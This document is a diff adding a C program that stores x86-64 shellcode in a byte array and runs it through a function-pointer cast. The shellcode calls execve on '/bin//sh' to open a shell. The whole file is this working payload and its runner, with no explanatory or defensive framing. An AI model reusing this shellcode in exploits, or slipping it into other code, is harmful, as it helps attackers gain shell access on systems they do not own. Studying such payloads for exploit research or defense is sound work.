@@ -1,0 +1,14 @@
+#include <stdio.h>
+
+int main(void)
+{
+	char shellcode[] = {
+		"\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53"
+		"\x48\x31\xd2\x048\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"
+		};
+	
+	(*(void(*)()) shellcode)();
+
+	return 0;
+}
+            
